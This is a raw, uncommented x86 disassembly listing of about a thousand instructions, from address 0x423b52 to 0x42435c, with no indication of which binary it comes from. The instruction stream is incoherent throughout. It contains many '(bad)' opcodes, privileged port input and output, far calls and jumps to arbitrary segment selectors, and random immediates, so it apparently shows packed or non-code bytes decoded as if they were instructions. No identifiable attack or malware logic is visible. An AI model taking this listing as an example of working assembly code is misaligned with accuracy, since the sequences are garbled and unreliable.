  423b52:	xchg   ebp,eax
  423b53:	push   esp
  423b54:	mov    al,0x17
  423b56:	mov    ecx,0xaab1dcbc
  423b5b:	add    ah,ah
  423b5d:	adc    eax,0x7d836d18
  423b62:	and    al,0xf
  423b64:	mov    WORD PTR [ebx-0x45c2a55f],fs
  423b6a:	pop    edi
  423b6b:	pop    edi
  423b6c:	add    bl,ah
  423b6e:	cmp    esp,DWORD PTR [edx]
  423b70:	mul    DWORD PTR [eax-0x7007af5]
  423b76:	ds cld 
  423b78:	in     al,0x33
  423b7a:	imul   edi,DWORD PTR [edi],0x3b633b70
  423b80:	jne    0x423bb6
  423b82:	cmp    ebx,DWORD PTR [edi-0x5aa776cf]
  423b88:	mov    ebp,0x1cce9d82
  423b8d:	pop    es
  423b8e:	stos   DWORD PTR es:[edi],eax
  423b8f:	lods   eax,DWORD PTR ds:[esi]
  423b90:	repz mov ah,0x2c
  423b93:	ror    DWORD PTR [esi+0x39de9d02],cl
  423b99:	adc    ebx,DWORD PTR [ebx]
  423b9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423b9c:	or     BYTE PTR [eax+0x48],dl
  423b9f:	xor    BYTE PTR [edi],ah
  423ba1:	fcom   st(1)
  423ba3:	sbb    cl,BYTE PTR [ecx+0x68]
  423ba6:	dec    ebp
  423ba7:	pusha  
  423ba8:	xchg   edi,eax
  423ba9:	(bad)  
  423baa:	(bad)
  423bae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423baf:	mov    al,0x9e
  423bb1:	rol    BYTE PTR [esi],1
  423bb3:	inc    edx
  423bb4:	in     eax,0x18
  423bb6:	les    ecx,FWORD PTR [eax]
  423bb8:	fld    QWORD PTR [edi]
  423bba:	add    ch,BYTE PTR [edi-0x1f1bbeb3]
  423bc0:	ret    
  423bc1:	adc    bh,BYTE PTR [esi]
  423bc3:	push   esp
  423bc4:	mov    ch,0xfe
  423bc6:	int3   
  423bc7:	leave  
  423bc8:	or     BYTE PTR [ebx-0x5d],bl
  423bcb:	xor    eax,0x133f9fbd
  423bd0:	adc    BYTE PTR [ebx],dl
  423bd2:	inc    eax
  423bd3:	das    
  423bd4:	inc    eax
  423bd5:	xor    bl,bl
  423bd7:	int    0x75
  423bd9:	add    al,0x60
  423bdb:	and    al,0xb3
  423bdd:	lods   al,BYTE PTR ds:[esi]
  423bde:	std    
  423bdf:	sbb    eax,0xb98a5ce6
  423be4:	pop    ss
  423be5:	repz lea edi,[edx-0x20]
  423be9:	cwde   
  423bea:	pop    ebp
  423beb:	je     0x423c15
  423bed:	call   0x5638:0x53f50fdb
  423bf4:	jno    0x423c57
  423bf6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423bf7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423bf8:	cli    
  423bf9:	mov    ch,0xfa
  423bfb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423bfc:	stos   DWORD PTR es:[edi],eax
  423bfd:	cdq    
  423bfe:	inc    ecx
  423bff:	imul   esp,DWORD PTR [eax+0x1d755ce],0x344d33c2
  423c09:	inc    ecx
  423c0a:	pop    ds
  423c0b:	add    cl,BYTE PTR [ecx-0x15]
  423c0e:	daa    
  423c0f:	adc    DWORD PTR [ebp-0x17],0xc7278e6
  423c16:	(bad)  
  423c17:	cdq    
  423c18:	scas   al,BYTE PTR es:[edi]
  423c19:	xchg   DWORD PTR [ebx+0x5e],edi
  423c1c:	xchg   ebp,eax
  423c1d:	push   ss
  423c1e:	ins    DWORD PTR es:[edi],dx
  423c1f:	adc    eax,0x7037b6ac
  423c24:	clc    
  423c25:	push   es
  423c26:	mov    DWORD PTR [eax],ebp
  423c28:	lds    ebx,FWORD PTR [esi+ecx*2+0x725b3abb]
  423c2f:	test   ebp,esp
  423c31:	cmp    DWORD PTR [eax-0x6c],0x7eb830e6
  423c38:	test   eax,0x336953f2
  423c3d:	shr    cl,cl
  423c3f:	pop    eax
  423c40:	aam    0x93
  423c42:	and    cl,BYTE PTR [eax+edi*1+0x30]
  423c46:	call   0x5f49938
  423c4b:	aas    
  423c4c:	test   DWORD PTR [edi-0xb],esp
  423c4f:	cmp    ch,BYTE PTR [edi]
  423c51:	xchg   si,ax
  423c53:	xor    eax,0x96de5b90
  423c58:	fstp   TBYTE PTR [ebp-0x49]
  423c5b:	pop    ds
  423c5c:	push   ebp
  423c5d:	dec    ebp
  423c5e:	jo     0x423c83
  423c60:	scas   eax,DWORD PTR es:[edi]
  423c61:	jg     0x423caf
  423c63:	mov    edi,0x29bfe581
  423c68:	adc    al,BYTE PTR [ebp-0x2b]
  423c6b:	sub    BYTE PTR [esp+esi*2-0x7a],bh
  423c6f:	sub    eax,0xdce19281
  423c74:	paddsw mm0,mm6
  423c77:	xchg   esi,eax
  423c78:	je     0x423c3f
  423c7a:	xor    eax,edi
  423c7c:	sbb    al,0x7e
  423c7e:	xor    al,0x34
  423c80:	adc    esp,DWORD PTR [edx-0x39a9d087]
  423c86:	fimul  DWORD PTR [esi]
  423c88:	outs   dx,DWORD PTR ds:[esi]
  423c89:	test   eax,0x4be78993
  423c8e:	jg     0x423ca0
  423c90:	mov    ch,0x27
  423c92:	repz test DWORD PTR [eax-0x77],0xefa06634
  423c9a:	loope  0x423d08
  423c9c:	nop
  423c9d:	ins    BYTE PTR es:[edi],dx
  423c9e:	push   0x955c4550
  423ca3:	mov    ch,0x40
  423ca5:	lahf   
  423ca6:	sub    esi,ebp
  423ca8:	push   edx
  423ca9:	cli    
  423caa:	iret   
  423cab:	jg     0x423c64
  423cad:	data16 xlat BYTE PTR ds:[ebx]
  423caf:	dec    DWORD PTR [ecx]
  423cb1:	inc    esi
  423cb2:	push   ds
  423cb3:	ins    DWORD PTR es:[edi],dx
  423cb4:	nop
  423cb5:	push   ebx
  423cb6:	push   edi
  423cb7:	cmp    BYTE PTR [edx-0x46],bh
  423cba:	dec    ebx
  423cbb:	sbb    bh,dh
  423cbd:	or     DWORD PTR [esi+0x6d5407e1],0x485fa05e
  423cc7:	push   ebp
  423cc8:	inc    eax
  423cc9:	cwde   
  423cca:	in     al,0x66
  423ccc:	enter  0xed1a,0xfb
  423cd0:	call   0x925fa16c
  423cd5:	add    ch,BYTE PTR [ebx]
  423cd7:	adc    bl,bh
  423cd9:	(bad)  
  423cda:	mov    cl,0xf5
  423cdc:	adc    BYTE PTR [ebp+ebx*2-0x46],cl
  423ce0:	add    BYTE PTR [edx+0x3bb29029],bl
  423ce6:	popf   
  423ce7:	int3   
  423ce8:	dec    ebp
  423ce9:	xchg   esi,eax
  423cea:	xchg   esp,eax
  423ceb:	push   ecx
  423cec:	push   eax
  423ced:	sahf   
  423cee:	jae    0x423d26
  423cf0:	push   ebx
  423cf1:	or     esp,DWORD PTR [edx-0x4b6177b5]
  423cf7:	cs xchg esi,eax
  423cf9:	or     esp,edi
  423cfb:	jmp    0x423d5e
  423cfd:	pop    ebp
  423cfe:	and    DWORD PTR [edi],0x32260b6d
  423d04:	or     eax,DWORD PTR [edx+0x2b]
  423d07:	add    al,ch
  423d09:	pop    ds
  423d0a:	and    BYTE PTR [ebx+ebp*4+0x8500acf],0xc8
  423d12:	mov    esi,0xce2f5c32
  423d17:	or     eax,0xdd340c58
  423d1c:	inc    ecx
  423d1d:	fmul   QWORD PTR [esi+0x69]
  423d20:	mov    ch,0x15
  423d22:	popf   
  423d23:	retf   
  423d24:	xor    al,BYTE PTR ds:0x2c534417
  423d2a:	cld    
  423d2b:	inc    ebx
  423d2c:	jg     0x423d48
  423d2e:	ins    DWORD PTR es:[edi],dx
  423d2f:	adc    cl,ah
  423d31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423d32:	js     0x423d19
  423d34:	(bad)  
  423d35:	or     esi,ebp
  423d37:	push   eax
  423d38:	aaa    
  423d39:	and    DWORD PTR [eax],ebp
  423d3b:	or     eax,0x666cb8c
  423d40:	or     dh,BYTE PTR ds:0xc76f6320
  423d46:	ficomp WORD PTR [eax+0x2]
  423d49:	int    0x70
  423d4b:	test   al,0x31
  423d4d:	sbb    edi,DWORD PTR ds:0x3cb9fe73
  423d53:	retf   0xe4c9
  423d56:	popa   
  423d57:	mov    ch,0xd5
  423d59:	sbb    BYTE PTR [edi-0x67],0xe2
  423d5d:	test   eax,0xa7d8e537
  423d62:	and    esp,DWORD PTR [ebx+eiz*4]
  423d65:	pop    es
  423d66:	repz jmp 0x314f:0x35773f05
  423d6e:	(bad)  
  423d6f:	out    dx,al
  423d70:	push   edi
  423d71:	push   esi
  423d72:	mov    bh,0xce
  423d74:	mov    edi,0xcca11f7e
  423d79:	je     0x423d29
  423d7b:	gs xor eax,0x1cab46d9
  423d81:	mov    dl,0xd4
  423d83:	popf   
  423d84:	std    
  423d85:	push   0xbd0572ce
  423d8a:	jns    0x423ddf
  423d8c:	jg     0x423d36
  423d8e:	push   edi
  423d8f:	cld    
  423d90:	aas    
  423d91:	adc    BYTE PTR [eax+0x11],bh
  423d94:	jecxz  0x423d32
  423d96:	(bad)  
  423d97:	call   FWORD PTR [ebx+0x1e5d68d3]
  423d9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423d9e:	mov    ds:0xded92d34,al
  423da3:	pop    ds
  423da4:	call   0x1a861b43
  423da9:	jb     0x423dc9
  423dab:	mov    ebx,0x46452e6c
  423db0:	jo     0x423d82
  423db2:	cmp    ch,BYTE PTR [ebx-0x5]
  423db5:	jg     0x423de7
  423db7:	int    0x31
  423db9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423dba:	shl    BYTE PTR [ecx-0x6d],cl
  423dbd:	add    eax,0x58a157e4
  423dc2:	test   DWORD PTR [ebx],esi
  423dc4:	adc    DWORD PTR [ebp+0xa8bcd3f],0x40
  423dcb:	add    eax,0xac88eb84
  423dd0:	shr    BYTE PTR [ebp+edi*1+0x23],cl
  423dd4:	push   0xfffffffc
  423dd6:	ficom  DWORD PTR [esi+0x58]
  423dd9:	jae    0x423ddd
  423ddb:	or     bh,bh
  423ddd:	mov    dh,0xa9
  423ddf:	or     bh,BYTE PTR [ecx-0x38ac1434]
  423de5:	int    0xf0
  423de7:	xor    eax,0x3cb1572f
  423dec:	(bad)  
  423ded:	je     0x423d92
  423def:	mov    BYTE PTR [ebp-0x493babea],bl
  423df5:	add    BYTE PTR [edx],ch
  423df7:	(bad)  
  423df8:	mov    es,WORD PTR [ebp-0x47]
  423dfb:	mov    ebx,eax
  423dfd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423dfe:	mov    BYTE PTR [ebp-0x55],dl
  423e01:	data16 in al,dx
  423e03:	outs   dx,BYTE PTR ds:[esi]
  423e04:	loope  0x423db5
  423e06:	fisttp QWORD PTR [ecx+0x7e]
  423e09:	push   0x54c5b552
  423e0e:	setno  BYTE PTR [eax-0x71]
  423e12:	jmp    0xe5babf76
  423e17:	into   
  423e18:	ret    
  423e19:	pop    ebp
  423e1a:	xchg   ecx,eax
  423e1b:	fst    QWORD PTR [esi+0x77]
  423e1e:	imul   BYTE PTR ds:0xc17d14bc
  423e24:	pop    ebp
  423e25:	popf   
  423e26:	inc    ch
  423e28:	sbb    dl,ch
  423e2a:	repz clc 
  423e2c:	mov    edi,DWORD PTR [esi+eax*1]
  423e2f:	call   0xf46b:0x7577d306
  423e36:	cli    
  423e37:	mov    bl,0xff
  423e39:	ja     0x423de8
  423e3b:	mov    edx,0xbb8b439f
  423e40:	or     eax,0x970985de
  423e45:	or     al,0x50
  423e47:	mov    esi,0x14b6615
  423e4c:	cmp    ebx,DWORD PTR [edx]
  423e4e:	mov    ecx,0xcfe13839
  423e53:	or     al,BYTE PTR [edi]
  423e55:	stos   DWORD PTR es:[edi],eax
  423e56:	test   al,0x2d
  423e58:	or     DWORD PTR [esi-0xac44f32],0x32
  423e5f:	mov    ecx,0x3e2db81d
  423e64:	sbb    BYTE PTR ds:0x10cae44b,ch
  423e6a:	xrelease mov BYTE PTR [esi-0x10bf0e0e],cl
  423e71:	jmp    0xff4e7503
  423e76:	xchg   ebp,eax
  423e77:	les    esp,FWORD PTR [ebx+ebx*1-0x73bb920f]
  423e7e:	sbb    DWORD PTR [edi+0x4ab4aaee],ecx
  423e84:	cs mov eax,0xf02697bc
  423e8a:	push   ss
  423e8b:	pusha  
  423e8c:	jle    0x423ee5
  423e8e:	test   eax,0xd1070e41
  423e93:	fst    QWORD PTR [ebp+ebx*2+0x14]
  423e97:	aaa    
  423e98:	pop    esp
  423e99:	ret    
  423e9a:	imul   eax,DWORD PTR [ebp+0x62],0xffffffe7
  423e9e:	fdiv   st,st(5)
  423ea0:	mov    dl,0xfa
  423ea2:	mov    al,ds:0xee20379f
  423ea7:	mov    eax,ds:0x93f2857c
  423eac:	mov    edi,0x8502fad0
  423eb1:	ss mov ecx,0xa84f9491
  423eb7:	out    0x13,eax
  423eb9:	adc    ah,bh
  423ebb:	aaa    
  423ebc:	sbb    eax,0x5d9b192f
  423ec1:	sbb    DWORD PTR [edx],edi
  423ec3:	into   
  423ec4:	mov    WORD PTR [edi],ss
  423ec6:	jb     0x423e7a
  423ec8:	aaa    
  423ec9:	bound  edi,QWORD PTR [ebx+0x7761e9bb]
  423ecf:	ins    DWORD PTR es:[edi],dx
  423ed0:	arpl   WORD PTR [ecx-0x409b3e4],cx
  423ed6:	mov    ch,0x56
  423ed8:	fidivr DWORD PTR [ebp+0x2]
  423edb:	and    esi,DWORD PTR [ecx]
  423edd:	push   0x14
  423edf:	push   0x370715f0
  423ee4:	les    ebx,FWORD PTR [edi+edi*2+0x4]
  423ee8:	or     al,0x25
  423eea:	cmc    
  423eeb:	aaa    
  423eec:	mov    ebp,0x59b40b03
  423ef1:	add    eax,0x3792aa4b
  423ef6:	ja     0x423f01
  423ef8:	inc    edi
  423ef9:	test   BYTE PTR [eax+0x2a],0x34
  423efd:	dec    edx
  423efe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423eff:	sbb    edi,ebx
  423f01:	sar    al,1
  423f03:	jecxz  0x423ea6
  423f05:	xchg   DWORD PTR [ecx],ecx
  423f07:	dec    edx
  423f08:	cmp    ebp,eax
  423f0a:	sbb    al,0x85
  423f0c:	into   
  423f0d:	mov    cl,ch
  423f0f:	nop
  423f10:	clc    
  423f11:	sbb    al,0x79
  423f13:	gs fs cmp eax,0x47235e89
  423f1a:	test   DWORD PTR [edi+eax*4],esp
  423f1d:	mov    eax,0x40cea1a9
  423f22:	mov    al,ds:0xfbc4e519
  423f27:	arpl   WORD PTR ds:0x4e9a9c3f,si
  423f2d:	cmp    esi,edi
  423f2f:	push   esp
  423f30:	add    bh,BYTE PTR [ebp+0x68248756]
  423f36:	pop    DWORD PTR [ecx]
  423f38:	pop    esp
  423f39:	fcom   DWORD PTR ds:0xdc37bc0f
  423f3f:	sbb    bl,cl
  423f41:	imul   ecx,edi,0x62
  423f44:	mov    al,0xd4
  423f46:	sub    eax,0x7be9fdff
  423f4b:	call   0x9ddc:0xc3c5f83
  423f52:	ss aas 
  423f54:	aad    0xda
  423f56:	adc    ch,BYTE PTR [ebx-0x15dcac8d]
  423f5c:	add    DWORD PTR [eax-0x7b],ecx
  423f5f:	jne    0x423eff
  423f61:	ret    
  423f62:	sbb    eax,0x8e6120ab
  423f67:	je     0x423f25
  423f69:	dec    edi
  423f6a:	ins    BYTE PTR es:[edi],dx
  423f6b:	mov    dl,0xa4
  423f6d:	call   DWORD PTR [esi]
  423f6f:	out    0x69,al
  423f71:	xor    bl,bl
  423f73:	jns    0x423f1a
  423f75:	(bad)
  423f79:	test   al,0x89
  423f7b:	push   edx
  423f7c:	sub    ecx,DWORD PTR [edi+0x22863118]
  423f82:	aam    0xf0
  423f84:	or     edi,DWORD PTR [eax+edi*8+0x30c52edc]
  423f8b:	mov    ebp,?
  423f8d:	stos   BYTE PTR es:[edi],al
  423f8e:	push   edx
  423f8f:	and    DWORD PTR [eax-0xe3772ba],esp
  423f95:	ror    bh,0x6
  423f98:	pop    ecx
  423f99:	mov    cs,ebx
  423f9b:	inc    edi
  423f9c:	sbb    BYTE PTR [eax-0xe4726a0],0xf3
  423fa3:	ret    
  423fa4:	in     eax,0x18
  423fa6:	popa   
  423fa7:	mov    esp,0x629472e3
  423fac:	add    cl,BYTE PTR [edx-0x3a0972db]
  423fb2:	mov    esp,0x778dbbd3
  423fb7:	xor    BYTE PTR [edi],dh
  423fb9:	(bad)  
  423fba:	or     al,BYTE PTR [eax+0x57]
  423fbd:	xchg   BYTE PTR [edi+0x1],ah
  423fc0:	sti    
  423fc1:	out    dx,al
  423fc2:	enterw 0xe7b7,0x75
  423fc7:	xchg   esp,eax
  423fc8:	xchg   ecx,eax
  423fc9:	sub    BYTE PTR [edx+edi*4],0x87
  423fcd:	in     al,dx
  423fce:	fadd   st(0),st
  423fd0:	jae    0x423fdf
  423fd2:	and    DWORD PTR [eax+esi*2],eax
  423fd5:	pop    ds
  423fd6:	pop    eax
  423fd7:	or     eax,0xc4bfb1ea
  423fdc:	lahf   
  423fdd:	jnp    0x423fd5
  423fdf:	in     al,dx
  423fe0:	mov    edi,0xcd5d7573
  423fe5:	pop    ds
  423fe6:	les    ebp,FWORD PTR [edx+0x7b]
  423fe9:	rol    DWORD PTR [eax-0x1b],0x61
  423fed:	pop    ebp
  423fee:	ins    BYTE PTR es:[edi],dx
  423fef:	loop   0x423fd7
  423ff1:	sbb    BYTE PTR [esi+0x6e],dl
  423ff4:	rol    BYTE PTR [eax],cl
  423ff6:	dec    edx
  423ff7:	(bad)  
  423ff8:	pop    es
  423ff9:	and    al,0xc1
  423ffb:	cmp    cl,BYTE PTR [ebx+0x13]
  423ffe:	sbb    cl,dh
  424000:	mov    ch,0x1a
  424002:	in     al,dx
  424003:	mov    ebx,0xb408e7cc
  424008:	bound  ecx,QWORD PTR [edx-0x12a22554]
  42400e:	mov    ebx,0x590f98d4
  424013:	arpl   cx,dx
  424015:	and    esi,ebp
  424017:	mov    al,0x50
  424019:	sub    BYTE PTR [ebx],cl
  42401b:	sbb    al,0x13
  42401d:	sbb    ecx,DWORD PTR [edi+ebp*8+0x9f7395a]
  424024:	ja     0x423fb5
  424026:	(bad)  
  424027:	xchg   BYTE PTR ds:0x4a1ed1ec,dh
  42402d:	mov    WORD PTR [ebx-0xf],gs
  424030:	jnp    0x423feb
  424032:	imul   edx,ebp,0xffffff87
  424035:	push   ebx
  424036:	jge    0x423ff9
  424038:	mov    ch,0xc8
  42403a:	mov    DWORD PTR [ebp+0xdd9230],ecx
  424040:	push   edi
  424041:	rcl    BYTE PTR [edx],1
  424043:	sub    eax,0xf9c7eb8e
  424048:	xor    eax,0x2f07d39e
  42404d:	xchg   esi,eax
  42404e:	test   eax,0x780a9418
  424053:	inc    edx
  424054:	pop    ss
  424055:	inc    ebp
  424056:	inc    edi
  424057:	fisttp WORD PTR [esi-0x4a03516f]
  42405d:	xchg   BYTE PTR [ebx+0x73],cl
  424060:	jbe    0x424031
  424062:	xchg   ecx,eax
  424063:	into   
  424064:	fs scas al,BYTE PTR es:[edi]
  424066:	data16 jnp 0x42407f
  424069:	mov    esi,0x19a6f00e
  42406e:	sar    ah,1
  424070:	(bad)  [esi+0x3f]
  424073:	fdiv   st,st(2)
  424075:	std    
  424076:	jge    0x424091
  424078:	imul   ecx,DWORD PTR fs:[edi],0x42
  42407c:	pop    esi
  42407d:	sahf   
  42407e:	cli    
  42407f:	xor    eax,0x1d780d89
  424084:	mov    ch,BYTE PTR [edi+0x2b]
  424087:	push   0x62e7bb86
  42408c:	sahf   
  42408d:	and    DWORD PTR [ecx],0xffffffc2
  424090:	mov    bh,0x9
  424092:	std    
  424093:	(bad)  
  424094:	ss fcom st(6)
  424097:	repnz xor edi,DWORD PTR ds:[edx+ecx*2-0x229615d8]
  4240a0:	sub    ebx,DWORD PTR [ebx]
  4240a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4240a3:	push   esi
  4240a4:	scas   eax,DWORD PTR es:[edi]
  4240a5:	enter  0xd3df,0x52
  4240a9:	xchg   edi,eax
  4240aa:	loope  0x42411e
  4240ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4240ad:	jmp    0x86da:0x1f0d92
  4240b4:	je     0x424120
  4240b6:	mov    edi,0xcf8c1a08
  4240bc:	and    al,BYTE PTR [esi+edx*1+0x196273d3]
  4240c3:	les    ecx,FWORD PTR ds:0xaef1e3ca
  4240c9:	(bad)  
  4240cb:	ret    0xa43f
  4240ce:	xchg   edi,eax
  4240cf:	cmp    DWORD PTR [edi],0xffffffae
  4240d2:	push   esp
  4240d3:	call   0xb53f5ef6
  4240d8:	sbb    eax,0xbc4e4510
  4240dd:	leave  
  4240de:	cli    
  4240df:	push   edi
  4240e0:	loope  0x4240a2
  4240e2:	(bad)  
  4240e3:	and    DWORD PTR [edi-0x1d],edx
  4240e6:	or     eax,0x8ceae64e
  4240eb:	xlat   BYTE PTR ds:[ebx]
  4240ec:	mov    ebp,DWORD PTR [ebx+edx*4]
  4240ef:	leave  
  4240f0:	outs   dx,BYTE PTR ds:[esi]
  4240f1:	dec    edi
  4240f2:	outs   dx,DWORD PTR ds:[esi]
  4240f3:	cmc    
  4240f4:	fsubr  QWORD PTR [ecx-0x56923c0a]
  4240fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4240fb:	mov    edi,gs
  4240fd:	fidivr WORD PTR [edi+ecx*2-0x21]
  424101:	push   ss
  424102:	jo     0x4240aa
  424104:	sub    DWORD PTR [ebp+0x4d],edi
  424107:	arpl   WORD PTR [edi],si
  424109:	sbb    DWORD PTR [eax-0x242281c],esi
  42410f:	in     al,0x49
  424111:	das    
  424112:	pop    ebx
  424113:	outs   dx,DWORD PTR ds:[esi]
  424114:	mov    al,ds:0x279c7e3e
  424119:	in     eax,0xf3
  42411b:	daa    
  42411c:	loopne 0x424136
  42411e:	js     0x4240d3
  424120:	pushf  
  424121:	xor    eax,0xf1ab6aba
  424126:	test   eax,0xca6a6b76
  42412b:	stos   BYTE PTR es:[edi],al
  42412c:	add    eax,0xe5ab5096
  424131:	cs push edi
  424133:	jmp    0xc194:0xe05abf40
  42413a:	add    bh,dh
  42413c:	mov    ds:0xe6c7570f,eax
  424141:	mov    bl,0x5
  424143:	inc    eax
  424144:	dec    eax
  424145:	test   BYTE PTR [ecx-0x67],al
  424148:	(bad)  
  42414b:	rcr    bx,cl
  42414e:	int    0x6a
  424150:	in     eax,dx
  424151:	mov    BYTE PTR [eax+ebp*2+0x47ac828a],bl
  424158:	imul   eax,DWORD PTR [ebp+0x10473a68],0xc
  42415f:	iret   
  424160:	repnz bound edi,QWORD PTR [ecx+0x31]
  424164:	and    DWORD PTR [eax+ebx*1-0x6d0dfdd2],0xec0f57ff
  42416f:	add    DWORD PTR [ebp-0x70],edx
  424172:	pusha  
  424173:	add    ecx,DWORD PTR [ebp+0x7f29455b]
  424179:	or     esi,ebx
  42417b:	push   ss
  42417c:	sub    dl,BYTE PTR [ebx-0x1fb8929e]
  424182:	and    edx,DWORD PTR [ecx-0x182a3bdb]
  424188:	outs   dx,BYTE PTR ds:[esi]
  424189:	stos   DWORD PTR es:[edi],eax
  42418a:	les    ecx,FWORD PTR [ebx]
  42418c:	pop    edi
  42418d:	jl     0x424169
  42418f:	rcl    BYTE PTR [ebp+0x1],cl
  424192:	cmp    cl,ch
  424194:	mov    ecx,0x9d2b0baa
  424199:	or     BYTE PTR [ebx+0x4],0x2a
  42419d:	inc    edx
  42419e:	cmp    esi,edi
  4241a0:	ss aam 0x2b
  4241a3:	and    BYTE PTR [ebp+0x7d35cc0e],bh
  4241a9:	adc    BYTE PTR [ebp+0x71],cl
  4241ac:	mov    al,ss:0x1200676d
  4241b2:	sbb    ebp,eax
  4241b4:	adc    bl,BYTE PTR [ebx+0x2831f6bc]
  4241ba:	js     0x424170
  4241bc:	sbb    BYTE PTR [ebx-0x4b],bl
  4241bf:	cmp    esp,DWORD PTR [esi+0x11]
  4241c2:	fs dec esi
  4241c4:	retf   
  4241c5:	out    dx,al
  4241c6:	xchg   esi,eax
  4241c7:	mov    eax,0x4432e23
  4241cc:	in     eax,dx
  4241cd:	dec    esp
  4241ce:	in     al,dx
  4241cf:	inc    esi
  4241d0:	push   ebx
  4241d1:	retf   0x31e3
  4241d4:	imul   DWORD PTR [esp+ebp*2+0x16]
  4241d8:	and    edx,DWORD PTR [edi]
  4241da:	adc    BYTE PTR [eax-0x4a71a8d5],ah
  4241e0:	pop    es
  4241e1:	inc    ebp
  4241e2:	sbb    BYTE PTR es:[ecx+0x2007e34d],bl
  4241e9:	mov    bh,0xfe
  4241eb:	and    DWORD PTR [ecx+0x8ae8243],edx
  4241f1:	sub    DWORD PTR [esi],ecx
  4241f3:	pop    esp
  4241f4:	ja     0x424232
  4241f6:	call   0xd746e23d
  4241fb:	in     al,dx
  4241fc:	jno    0x4241b6
  4241fe:	mov    dh,bh
  424200:	aad    0xf6
  424202:	mul    DWORD PTR [eax-0x5d]
  424205:	daa    
  424206:	xor    bh,BYTE PTR [ebx+esi*4-0x77904f7c]
  42420d:	xchg   ebx,eax
  42420e:	scas   al,BYTE PTR es:[edi]
  42420f:	and    bl,BYTE PTR [ebp-0x30def91]
  424215:	pop    ebx
  424216:	pop    esp
  424217:	daa    
  424218:	sbb    ah,BYTE PTR [ecx-0x10ac5ab8]
  42421e:	retf   0x89c3
  424221:	cwde   
  424222:	nop
  424223:	popa   
  424224:	inc    edi
  424225:	data16 add al,BYTE PTR [ecx+0x25d34b67]
  42422c:	push   es
  42422d:	add    ebx,DWORD PTR [esi-0x30dda537]
  424233:	mov    ss,WORD PTR [esi+0x32]
  424236:	addr16 jo 0x424283
  424239:	sbb    esp,DWORD PTR [ebx-0x12f28d74]
  42423f:	pop    ecx
  424240:	and    DWORD PTR ds:0x5936325e,edi
  424246:	add    eax,0xd9be0fd3
  42424b:	inc    edx
  42424c:	dec    esp
  42424d:	lock cmp al,0xb9
  424250:	sub    al,0x9a
  424252:	inc    ebp
  424253:	cmp    dl,BYTE PTR [edx]
  424255:	mov    ebx,0xbc2cd44f
  42425a:	mov    ah,0xb3
  42425c:	jp     0x42421c
  42425e:	in     eax,dx
  42425f:	xchg   esp,eax
  424260:	jp     0x4242b2
  424262:	sbb    eax,0x83cc785c
  424267:	(bad)  
  424268:	call   0x53808a15
  42426d:	xor    esp,DWORD PTR [eax]
  42426f:	jne    0x4242a1
  424271:	sbb    cl,BYTE PTR [esi+eiz*2]
  424274:	mov    dl,BYTE PTR [esi-0x367ce3c1]
  42427a:	stos   BYTE PTR es:[edi],al
  42427b:	jb     0x424282
  42427d:	inc    edi
  42427e:	adc    ah,dl
  424280:	and    BYTE PTR [edi],ah
  424282:	mov    esi,0x4fb84a07
  424287:	outs   dx,BYTE PTR ds:[esi]
  424288:	dec    ecx
  424289:	mov    dl,BYTE PTR [esp+ecx*1]
  42428c:	lods   al,BYTE PTR ds:[esi]
  42428d:	dec    edi
  42428e:	icebp  
  42428f:	jle    0x424280
  424291:	xor    esp,DWORD PTR [eax+0x7c]
  424294:	dec    eax
  424295:	mov    ebp,0xb58dbad
  42429a:	es xor al,0xb5
  42429d:	cmp    eax,0x6cc666
  4242a2:	push   0xdc516aef
  4242a7:	mov    dl,0x59
  4242a9:	fcom   QWORD PTR [ecx+0x19]
  4242ac:	add    DWORD PTR [ebx+0x67],ebp
  4242af:	ror    BYTE PTR [ebx+0x6f],0x86
  4242b3:	jmp    0x101b1327
  4242b8:	cmp    eax,0x43ba2055
  4242bd:	pusha  
  4242be:	cmp    eax,0xeccf2a83
  4242c3:	call   DWORD PTR [edx+0x3ad3b8e9]
  4242c9:	xchg   esi,eax
  4242ca:	xor    BYTE PTR [ecx+0x53],al
  4242cd:	ret    0x35a3
  4242d0:	out    0x3a,al
  4242d2:	int    0x1c
  4242d4:	add    DWORD PTR [eax+0x21e9a4f3],0xffffffd4
  4242db:	hlt    
  4242dc:	sub    al,0x15
  4242de:	pushaw 
  4242e0:	das    
  4242e1:	popa   
  4242e2:	mov    ebx,0xc5b87087
  4242e7:	cmp    dh,bl
  4242e9:	mov    ds:0x3883cbfe,al
  4242ee:	xor    DWORD PTR [ebx+0x5813b5e],ebp
  4242f4:	rol    BYTE PTR [ebp-0x364665d0],0xdd
  4242fb:	into   
  4242fc:	clc    
  4242fd:	in     al,dx
  4242fe:	pushf  
  4242ff:	inc    eax
  424300:	or     esi,DWORD PTR [ebp-0x4f93f72e]
  424306:	adc    BYTE PTR [eax-0x382bcd0d],0x44
  42430d:	inc    esp
  42430e:	inc    ebp
  42430f:	iret   
  424310:	imul   ebx,DWORD PTR [edi-0x45],0x11d5d15
  424317:	(bad)  
  424318:	in     eax,dx
  424319:	adc    eax,0xdd4ba8f2
  42431e:	push   ebx
  42431f:	mul    DWORD PTR [ebx+0x3f023cff]
  424325:	sub    dl,0x4c
  424328:	jecxz  0x42431d
  42432a:	mov    ch,0xf2
  42432c:	nop
  42432d:	or     cl,dh
  42432f:	jne    0x4243a6
  424331:	pop    esi
  424332:	or     DWORD PTR [esp+ebx*4-0x4e049485],edi
  424339:	mov    edi,0x819bdcde
  42433e:	aam    0x2a
  424340:	ja     0x42433e
  424342:	cmp    BYTE PTR [esi-0x26af429d],cl
  424348:	xchg   esi,eax
  424349:	lea    ebp,[edx+0x63502a20]
  42434f:	xchg   edi,eax
  424350:	push   cs
  424351:	or     ecx,DWORD PTR [ebp+0x4b]
  424354:	push   esp
  424355:	lods   al,BYTE PTR es:[esi]
  424357:	sbb    BYTE PTR [ebp+0x6b],dh
  42435a:	jg     0x4242fa
  42435c:	mov    ebx,0xca288ed4
